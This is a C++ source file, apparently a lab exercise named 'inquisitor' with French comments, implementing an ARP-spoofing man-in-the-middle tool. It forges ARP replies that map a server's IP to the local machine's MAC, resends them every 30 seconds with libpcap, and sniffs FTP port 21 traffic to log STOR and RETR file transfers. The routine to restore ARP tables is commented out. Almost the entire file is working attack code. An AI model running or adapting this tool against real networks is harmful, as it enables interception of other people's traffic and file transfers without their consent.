#include <iostream>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <thread>
#include <chrono>
#include <iomanip>

struct eth_header
{
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t eth_type;
};

struct arp_packet
{
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_len;
    uint8_t proto_len;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};

struct ip_header
{
    unsigned char ip_header_len : 4;
    unsigned char ip_version : 4;
    unsigned char ip_tos;
    unsigned short ip_total_length;
    unsigned short ip_id;
    unsigned char ip_frag_offset : 5;
    unsigned char more_fragment : 1;
    unsigned char dont_fragment : 1;
    unsigned char reserved_zero : 1;
    unsigned char ip_frag_offset1;
    unsigned char ip_ttl;
    unsigned char ip_protocol;
    unsigned short ip_checksum;
    unsigned int ip_srcaddr;
    unsigned int ip_destaddr;
};

struct tcp_header
{
    u_short sport;
    u_short dport;
    u_int seq;
    u_int ack_seq;
    u_char reserved : 4;
    u_char doff : 4;
    u_char flags;
    u_short window;
    u_short check;
    u_short urg_ptr;
};

void signalHandler(int signum)
{
    std::cout << "Interception du signal " << signum << ", restauration des tables ARP et sortie.\n";
    // restoreArpTables();
    exit(signum);
}

void checkArgs(int argc, char **argv)
{
    if (argc < 4)
    {
        std::cout << "Usage: " << argv[0] << " <IP-src> <MAC-src> <IP-target> <MAC-target>" << std::endl;
        exit(1);
    }
}

int getLocalInfo(const char *iface, uint8_t *ip_address, uint8_t *mac_address)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) != -1)
    {
        struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
        memcpy(ip_address, &(ipaddr->sin_addr.s_addr), 4);

        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, ip_address, ip_str, INET_ADDRSTRLEN);
        std::cout << "ip local: " << ip_str << std::endl;
    }
    else
    {
        std::cout << "Failed to get local IP address." << std::endl;
        return -1;
    }

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != -1)
    {
        memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
        char mac_str[18];
        sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                mac_address[0], mac_address[1], mac_address[2],
                mac_address[3], mac_address[4], mac_address[5]);
        std::cout << "mac local: " << mac_str << std::endl;
    }
    else
    {
        std::cout << "Failed to get local MAC address." << std::endl;
        return -1;
    }

    close(fd);
    return 0;
}

void convertArgsClient(uint8_t *ip_address_client, uint8_t *mac_address_client, const char *ipClient, const char *macClient)
{
    // convert ip client to uint array
    if (inet_pton(AF_INET, ipClient, ip_address_client) <= 0)
    {
        std::cout << "inet_pton failed" << std::endl;
        exit(1);
    }
    else
    {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, ip_address_client, ip_str, INET_ADDRSTRLEN);
        std::cout << "ip addr client : " << ip_str << std::endl;
    }

    // Convert la chaîne MAC en tableau de uint
    sscanf(macClient, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_address_client[0], &mac_address_client[1], &mac_address_client[2],
           &mac_address_client[3], &mac_address_client[4], &mac_address_client[5]);

    char mac_str[18];
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac_address_client[0], mac_address_client[1], mac_address_client[2],
            mac_address_client[3], mac_address_client[4], mac_address_client[5]);
    std::cout << "mac addr client: " << mac_str << std::endl;
}

void convertArgsServer(uint8_t *ip_address_server, uint8_t *mac_address_server, const char *ipServer, const char *macServer)
{
    // convert ip client to uint array
    if (inet_pton(AF_INET, ipServer, ip_address_server) <= 0)
    {
        std::cout << "inet_pton failed" << std::endl;
        exit(1);
    }
    else
    {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, ip_address_server, ip_str, INET_ADDRSTRLEN);
        std::cout << "ip addr server: " << ip_str << std::endl;
    }

    // Convert la chaîne MAC en tableau de uint
    sscanf(macServer, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_address_server[0], &mac_address_server[1], &mac_address_server[2],
           &mac_address_server[3], &mac_address_server[4], &mac_address_server[5]);
    char mac_str[18];
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac_address_server[0], mac_address_server[1], mac_address_server[2],
            mac_address_server[3], mac_address_server[4], mac_address_server[5]);
    std::cout << "mac addr client: " << mac_str << std::endl;
}

uint8_t *buildPacketARP(uint8_t *ip_address_client, uint8_t *mac_address_client, uint8_t *ip_address_server, uint8_t *mac_address_server, uint8_t *local_ip_address, uint8_t *local_mac_address)
{
    uint8_t *packet = new uint8_t[sizeof(eth_header) + sizeof(arp_packet)];

    arp_packet arp = {
        hw_type : htons(0x0001),    // Ethernet
        proto_type : htons(0x0800), // IP
        hw_len : 6,                 // MAC address length
        proto_len : 4,              // IP address length
        opcode : htons(2),          // ARP Request
    };
    memcpy(arp.target_mac, mac_address_client, 6);
    memcpy(arp.target_ip, ip_address_client, 4);

    memcpy(arp.sender_mac, local_mac_address, 6);
    memcpy(arp.sender_ip, ip_address_server, 4);

    eth_header eth = {
        eth_type : htons(0x0806), // ARP 0x0806, IPv4 0x0800.
    };
    memcpy(eth.dest_mac, mac_address_client, 6);
    memcpy(eth.src_mac, local_mac_address, 6);

    // build packet
    memcpy(packet, &eth, sizeof(eth_header));
    memcpy(packet + sizeof(eth_header), &arp, sizeof(arp_packet));

    if (packet == nullptr)
    {
        std::cerr << "Impossible de construire le paquet ARP.";
        exit(1);
    }
    return packet;
}

void sendARPSpoofing(uint8_t *packet, pcap_t *handle)
{
    int test = pcap_sendpacket(handle, packet, sizeof(eth_header) + sizeof(arp_packet));
    if (test != 0)
    {
        std::cerr << "pcap_sendpacket() a échoué.\n";
        delete[] packet;
        exit(1);
    }
    else
    {
        std::cout << "Spoofing sent\n";
    }
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    struct eth_header *eth = (struct eth_header *)(packet);
    struct ip_header *ip = (struct ip_header *)(packet + sizeof(struct eth_header));
    struct tcp_header *tcp = (struct tcp_header *)(packet + sizeof(struct eth_header) + sizeof(struct ip_header));

    // std::cout << "Paquet recu a : " << pkthdr->ts.tv_sec << std::endl;
    // std::cout << "Paquet capturé : " << pkthdr->len << " octets" << std::endl;
    // std::cout << "Paquet capturé : " << pkthdr->caplen << " octets" << std::endl;
    // std::cout << "Nombre d'octets ignorés par le réseau : " << pkthdr->len - pkthdr->caplen << std::endl
    //           << std::endl
    //           << std::endl;

    // std::cout << "Paquet : " << packet << std::endl;

    u_char *data = (u_char *)(packet + sizeof(struct eth_header) + sizeof(struct ip_header) + sizeof(struct tcp_header));

    int data_size = pkthdr->len - (sizeof(struct eth_header) + sizeof(struct ip_header) + sizeof(struct tcp_header));
    // std::cout << "Taille des données : " << data_size << std::endl;

    if (data_size > 0)
    {
        std::string ftp_data(reinterpret_cast<const char *>(data), data_size);

        if (ftp_data.find("STOR") != std::string::npos)
        {
            std::cout << "STOR file name : " << ftp_data << std::endl;
        }
        if (ftp_data.find("RETR") != std::string::npos)
        {
            std::cout << "RETR file name : " << ftp_data << std::endl;
        }
    }
}

void captureFtpPackets(pcap_t *handle)
{
    struct bpf_program fp;
    char filter_exp[] = "port 21"; // Filtre FTP, port 21
    bpf_u_int32 net;

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
    {
        std::cerr << "Couldn't parse filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
        return;
    }
    if (pcap_setfilter(handle, &fp) == -1)
    {
        std::cerr << "Couldn't install filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
        return;
    }
    pcap_loop(handle, 0, process_packet, nullptr);
}

void periodicArpSpoofing(pcap_t *handle, uint8_t *packet)
{
    while (true)
    {
        sendARPSpoofing(packet, handle);
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}

// g++ inquisitor.cpp -o inquisitor -lpcap -lpthread && ./inquisitor 172.20.0.2 02:42:ac:14:00:02 172.20.0.4 02:42:ac:14:00:04
int main(int argc, char *argv[])
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    signal(SIGINT, signalHandler);

    uint8_t ip_address_client[4];
    uint8_t mac_address_client[6];

    uint8_t ip_address_server[4];
    uint8_t mac_address_server[6];

    uint8_t local_ip_address[4];
    uint8_t local_mac_address[6];

    const char *ipClient = argv[1];
    const char *macClient = argv[2];
    const char *ipServer = argv[3];
    const char *macServer = argv[4];

    uint8_t *packet;

    checkArgs(argc, argv);
    convertArgsClient(ip_address_client, mac_address_client, ipClient, macClient);
    convertArgsServer(ip_address_server, mac_address_server, ipServer, macServer);
    getLocalInfo("eth0", local_ip_address, local_mac_address);

    // Open the session
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        return 2;
    }
    else
    {
        std::cout << "handle : " << handle << std::endl;
    }

    packet = buildPacketARP(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);

    std::thread arp_thread(periodicArpSpoofing, handle, packet);
    captureFtpPackets(handle);

    arp_thread.join();
    pcap_close(handle);
    delete[] packet;

    return 0;
}